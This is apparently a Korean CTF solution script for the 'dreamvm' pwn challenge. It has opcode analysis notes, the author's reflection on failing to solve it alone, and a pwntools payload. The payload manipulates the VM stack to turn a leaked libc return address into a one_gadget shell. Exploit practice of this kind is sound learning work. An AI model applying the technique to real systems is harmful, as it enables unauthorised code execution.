'''
메인 아이디어
> read, write를 할 수 있다?
-> write_all로 릭하기
-> read로는 릭하기 위한 준비...
'''

'''
디컴파일된 결과로 분석

case 1: # PUSH
    v16 -=8
    *v16 = v17[0]

case 2: # POP
    v17[0] = *v16
    v16 += 8

case 3:
    v17[0] += *v9+1; rip(??맞나) += 9(뒤로 8개의 값(바이트)들을 받아 누산기에 더함)

case 4:
    v16 += *v9+1; rip += 9(얘는 3번이랑 같은데 스택 포인터에 더함)

case 5:
    write_all() < 읽어서 8바이트 출력

case 6:
    read_all()
'''

# 내 머리로는 풀 수 없다...

# gdb.attach(p)
# pause()

'''
결국엔 끈기도 없고 머리도 안 좋아서 못 풀었다...
풀이를 보고 아래는 정리한 내용임

1. 머신 동작 방식은 개쉬워서 파악 가능, 취약점도 진작에 알았음. 문제는 다음인..(대충 핑계)
- ) 파이썬으로 지금까지 pwntools만 거의 쓰며 익스플로잇을 진행해 왔음. 
- ) 지금까지 IDA, Ghidra 어떤 것도 제대로 사용하지 못했음. 변수명 리네임 하는 것 조차 하지 않는 습관 때문에...
- ) 지금까지 단 한 번도 IDA/Ghidra에서 디버깅을 해본 적이 없음.
-) pay 문제를 풀어본 적이 단 한 번도 없음.

2. 머신에 넣을 코드를 어떻게 입력해야할지 감도 안 잡힘. AI를 쓰려고 했으나, 고작 4레벨 pay 문제에 볼 게 뭐가 있나 싶어 고집 부리다 풀이 봄.
- ) (쨍그랑!!!)

... 적절한 변명도 없지만 굳이 모아서 말하자면 그렇습니다..
그냥 경험도 부족한데 너무 오만했던 것 같음
1월도 얼마 남지 않았으니 지금이라도 귀찮았던 걸 해야할듯
이래놓고 2월이 되어서야 시작함
'''

from pwn import *

context.binary = elf = ELF('./dreamvm')
context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]

HOST, PORT = "ASDF 1234".split()

if args.REMOTE:
    p = remote(HOST, PORT)
else:
    p = process() # or env can be added

# gdb.attach(p, '''
# b *main+348
# ''')
# pause()

# og_list = [0x4f35e, 0x4f365, 0x4f3c2, 0x10a45c]

# pay = b'\x03'
# pay += p64(0x4141414141414141) # 8bytes of dummy
# pay += b'\xff' * (0x100 - len(pay))

'''
0000000000400914 T _fini
0000000000400920 R _IO_stdin_used
0000000000400958 r __GNU_EH_FRAME_HDR
0000000000400b1c r __FRAME_END__
0000000000600da8 d __frame_dummy_init_array_entry
0000000000600da8 d __init_array_start
0000000000600db0 d __do_global_dtors_aux_fini_array_entry
0000000000600db0 d __init_array_end
0000000000600db8 d _DYNAMIC
0000000000600fa8 d _GLOBAL_OFFSET_TABLE_
0000000000601000 D __data_start
0000000000601000 W data_start
0000000000601008 D __dso_handle
0000000000601010 D __TMC_END__
0000000000601010 B __bss_start
0000000000601010 D _edata
0000000000601020 b completed.7698
0000000000601040 b code << 0x100 size
0000000000601140 B _end <<
'''

pay = b"\x04"
pay += p64(0x30)
pay += b"\x02"
pay += b"\x03"
pay += p64(0x10a45c - 0x21b97)
pay += b"\x01"
pay += b"\xff" * (0x100 - len(pay))

p.send(pay)

p.interactive()